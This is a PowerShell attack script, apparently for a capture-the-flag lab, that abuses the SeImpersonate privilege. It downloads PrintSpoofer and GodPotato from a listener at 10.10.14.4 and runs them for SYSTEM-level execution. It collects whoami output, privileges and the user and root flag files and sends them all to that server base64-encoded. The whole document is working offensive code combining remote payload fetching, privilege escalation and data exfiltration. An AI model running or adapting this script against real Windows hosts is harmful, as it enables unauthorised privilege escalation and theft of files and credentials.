# find_flags.ps1 - SeImpersonate Privilege Escalation & Flag Retrieval
$exfilServer = "http://10.10.14.4:9001"

function Exfil($data) {
    try {
        $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))
        Invoke-WebRequest -Uri "$exfilServer/exfil?data=$encoded" -UseBasicParsing -ErrorAction SilentlyContinue
    } catch {}
}

function ExfilFile($path, $label) {
    if (Test-Path $path) {
        $content = Get-Content $path -Raw
        Exfil "$label : $content"
    } else {
        Exfil "$label : FILE NOT FOUND at $path"
    }
}

$whoami = whoami
$privs = whoami /priv
Exfil "=== CURRENT USER ===`n$whoami`n`n=== PRIVILEGES ===`n$privs"

$userFlagPaths = @("C:\Users\*\Desktop\user.txt","C:\Users\*\user.txt")
foreach ($pattern in $userFlagPaths) {
    $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
    foreach ($file in $files) { ExfilFile $file.FullName "USER FLAG" }
}

$potatoUrl = "$exfilServer/PrintSpoofer64.exe"
$potatoPath = "$env:TEMP\ps.exe"

try {
    Invoke-WebRequest -Uri $potatoUrl -OutFile $potatoPath -UseBasicParsing -ErrorAction Stop
    Exfil "PrintSpoofer downloaded to $potatoPath"
    
    $flagScript = @"
`$flags = ""
`$rootFlag = "C:\Users\Administrator\Desktop\root.txt"
`$userFlag = Get-ChildItem -Path "C:\Users\*\Desktop\user.txt" -ErrorAction SilentlyContinue | Select-Object -First 1
if (Test-Path `$rootFlag) { `$flags += "ROOT: " + (Get-Content `$rootFlag -Raw) + "`n" }
if (`$userFlag) { `$flags += "USER: " + (Get-Content `$userFlag.FullName -Raw) }
`$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(`$flags))
Invoke-WebRequest -Uri "$exfilServer/flags?data=`$encoded" -UseBasicParsing
"@
    
    $flagScriptPath = "$env:TEMP\gf.ps1"
    $flagScript | Out-File -FilePath $flagScriptPath -Encoding ASCII
    $output = & $potatoPath -c "powershell -ExecutionPolicy Bypass -File $flagScriptPath" 2>&1
    Exfil "PrintSpoofer output: $output"
} catch {
    Exfil "PrintSpoofer method failed: $_"
    try {
        $godPotatoUrl = "$exfilServer/GodPotato.exe"
        $godPotatoPath = "$env:TEMP\gp.exe"
        Invoke-WebRequest -Uri $godPotatoUrl -OutFile $godPotatoPath -UseBasicParsing -ErrorAction Stop
        Exfil "GodPotato downloaded"
        $cmd = "powershell -c `"Get-Content C:\Users\Administrator\Desktop\root.txt | ForEach-Object { Invoke-WebRequest -Uri '$exfilServer/root?flag=`$_' -UseBasicParsing }`""
        $output = & $godPotatoPath -cmd $cmd 2>&1
        Exfil "GodPotato output: $output"
    } catch { Exfil "GodPotato method failed: $_" }
}

$flagLocations = @("C:\Users\Administrator\Desktop\root.txt","C:\root.txt","C:\Users\Administrator\root.txt")
foreach ($path in $flagLocations) { ExfilFile $path "ROOT FLAG DIRECT" }
Exfil "=== SCRIPT COMPLETED ==="

